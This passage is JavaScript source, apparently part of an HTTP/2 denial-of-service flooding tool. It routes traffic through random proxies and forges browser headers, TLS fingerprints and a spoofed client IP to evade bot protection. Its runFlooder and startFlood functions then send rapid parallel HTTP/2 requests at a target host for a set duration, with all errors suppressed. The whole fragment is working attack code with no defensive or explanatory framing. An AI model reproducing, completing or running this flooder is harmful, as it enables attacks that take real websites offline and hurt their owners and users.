        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "referer": refers[Math.floor(Math.random() * refers.length)]
    };
    Object.keys(baseHeaderSet).forEach(key => {
        if (!headers[key] || headers[key].trim() === "") {
            headers[key] = baseHeaderSet[key];
        }
    });
    if (!headers["user-agent"] || headers["user-agent"].trim() === "") {
        headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36";
    }
    if (!headers["accept"] || headers["accept"].trim() === "") {
        headers["accept"] = accept_header_fixed;
    }
    if (!headers["referer"] || headers["referer"].trim() === "") {
        const refererSites = [
            "https://www.google.com/search?q=" + encodeURIComponent(targetHost),
            "https://www.facebook.com/",
            "https://www.instagram.com/",
            "https://twitter.com/",
            "https://www.linkedin.com/",
            "https://www.youtube.com/",
            "https://www.bing.com/search?q=" + encodeURIComponent(targetHost),
            "https://duckduckgo.com/?q=" + encodeURIComponent(targetHost),
            "https://www.reddit.com/",
            `https://${targetHost}/`
        ];
        headers["referer"] = randomElement(refererSites);
    }
    if (Math.random() < 0.15) {
        headers["dnt"] = "1";
    }
    headers["sec-ch-ua"] = sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)];
    headers["sec-ch-ua-mobile"] = sec_ch_ua_mobile[Math.floor(Math.random() * sec_ch_ua_mobile.length)];
    headers["sec-ch-ua-platform"] = sec_ch_ua_platform[Math.floor(Math.random() * sec_ch_ua_platform.length)];
    headers["sec-fetch-site"] = fetch_site[Math.floor(Math.random() * fetch_site.length)];
    headers["sec-fetch-mode"] = fetch_mode[Math.floor(Math.random() * fetch_mode.length)];
    headers["sec-fetch-dest"] = fetch_dest[Math.floor(Math.random() * fetch_dest.length)];
    return headers;
}

function validateAndFixHeaders(headers) {
    const criticalHeaders = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "accept": accept_header_fixed,
        "referer": `https://www.google.com/search?q=${encodeURIComponent(headers[":authority"] || "example.com")}`
    };
    Object.keys(criticalHeaders).forEach(header => {
        if (!headers[header] || headers[header].trim() === "") {
            headers[header] = criticalHeaders[header];
        }
    });
    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    const originalPath = parsedTarget.path;
    const browserFP = generateBrowserFingerprint();

    const headers = getStandardBrowserHeaders(parsedTarget.host, originalPath);
    const cleanedHeaders = removeXForwardedHeaders(headers);
    const validatedHeaders = validateAndFixHeaders(cleanedHeaders);
    
    if (Math.random() < 0.1) {
        const legitIP = generateLegitIP();
        const subtleHeaders = {
            "true-client-ip": legitIP
        };
        Object.assign(validatedHeaders, subtleHeaders);
    }
            
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);
        modifyTcpOptions(connection);

        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: [
                "h2",
                "http/1.1"
            ],
            ciphers: ciphers,
            sigalgs: SignalsList,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            session: null,
            minVersion: tls_versions[0],
            maxVersion: tls_versions[1]
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        applyTLSFingerprint(tlsConn);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 10000);
        tlsConn.setMaxListeners(0);

        let h2State = {
            streamIdCounter: 1,
            isConnected: false,
            sentInitialFrames: false,
            responseCount: 0,
            packetsPerSecond: 0,
            currentDelay: getRandomDelay(),
            parallelRequests: randomElement(BROWSER_TIMING.PARALLEL_REQUESTS)
        };

        tlsConn.on('secureConnect', () => {});

        tlsConn.on('data', (data) => {
            if (!h2State.isConnected) {
                if (data.toString().includes('HTTP/2')) {
                    h2State.isConnected = true;
                    tlsConn.write(Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'));
                    setTimeout(() => {
                        if (!h2State.sentInitialFrames) {
                            tlsConn.write(createH2SettingsFrame());
                            setTimeout(() => {
                                tlsConn.write(createH2WindowUpdateFrame(windowUpdateIncrement));
                                h2State.sentInitialFrames = true;
                                setTimeout(() => {
                                    startFlood();
                                }, getRandomDelay());
                            }, getRandomDelay() / 2);
                        }
                    }, getRandomDelay() / 3);
                }
            }
        });

        function startFlood() {
            const memCheckInterval = setInterval(() => {
                try {
                    checkHeapStatus();
                } catch (e) {}
            }, 30000);
            
            let activeRequests = 0;
            
            const attackInterval = setInterval(() => {
                try {
                    if (activeRequests >= SAFE_MEMORY_SETTINGS.MAX_CONCURRENT_REQUESTS) {
                        return;
                    }
                    const parallelCount = Math.min(
                        args.Rate, 
                        h2State.parallelRequests,
                        SAFE_MEMORY_SETTINGS.MAX_CONCURRENT_REQUESTS - activeRequests
                    );
                    for (let i = 0; i < parallelCount; i++) {
                        try {
                            const streamId = h2State.streamIdCounter;
                            h2State.streamIdCounter += 2;
                            validatedHeaders[":path"] = generateLegitPath(`https://${parsedTarget.host}/`, originalPath);
                            const requestHeaders = validateAndFixHeaders({...validatedHeaders});
                            const MAX_FRAME_SIZE = SAFE_MEMORY_SETTINGS.MAX_FRAME_SIZE;
                            activeRequests++;
                            const headerFrame = createH2HeadersFrameWithEncoding(
                                requestHeaders,
                                streamId,
                                true,
                                {
                                    exclusive: true,
                                    dependsOn: 0,
                                    weight: 256
                                }
                            );
                            if (headerFrame && headerFrame.length <= MAX_FRAME_SIZE) {
                                try {
                                    tlsConn.write(headerFrame, () => {
                                        activeRequests--;
                                    });
                                    h2State.packetsPerSecond++;
                                } catch (err) {
                                    activeRequests--;
                                }
                            } else {
                                activeRequests--;
                            }
                        } catch (err) {
                            if (activeRequests > 0) activeRequests--;
                        }
                    }
                    if (Math.random() > 0.8) {
                        optimizeMemoryUsage();
                    }
                } catch (err) {}
            }, h2State.currentDelay);
            
            setTimeout(() => {
                clearInterval(attackInterval);
                clearInterval(memCheckInterval);
                optimizeMemoryUsage();
                activeRequests = 0;
                try {
                    tlsConn.destroy();
                    connection.destroy();
                } catch (e) {}
            }, args.time * 1000);
        }

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: http2Settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.on("connect", () => {
            if (!h2State.sentInitialFrames) {
                if (client._socket) {
                    setTimeout(() => {
                        const settingsFrame = createH2SettingsFrame();
                        client._socket.write(settingsFrame);
                        setTimeout(() => {
                            const windowUpdateFrame = createH2WindowUpdateFrame(windowUpdateIncrement);
                            client._socket.write(windowUpdateFrame);
                        }, getRandomDelay() / 2);
                    }, getRandomDelay() / 3);
                }
                simulateBrowserNavigation(client, headers, parsedTarget);
                const IntervalAttack = setInterval(() => {
                    const batchSize = Math.min(args.Rate, randomElement(BROWSER_TIMING.PARALLEL_REQUESTS));
                    for (let i = 0; i < batchSize; i++) {
                        const requestHeaders = randomizeHeaders(headers);
                        const request = client.request(requestHeaders, {
                            endStream: true,
                            exclusive: true,
                            parent: 0,
                            weight: 256,
                            waitForTrailers: false
                        });
                        request.on("response", response => {
                            request.close();
                            request.destroy();
                            return;
                        });
                        request.end();
                        if (i < batchSize - 1) {
                            const shortDelay = Math.random() * 20;
                            new Promise(resolve => setTimeout(resolve, shortDelay));
                        }
                    }
                }, getRandomDelay() * 5);
            }
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

try {
    if (typeof global.gc !== 'function') {
        console.log('Run with --expose-gc to enable garbage collection');
    }
} catch (e) {}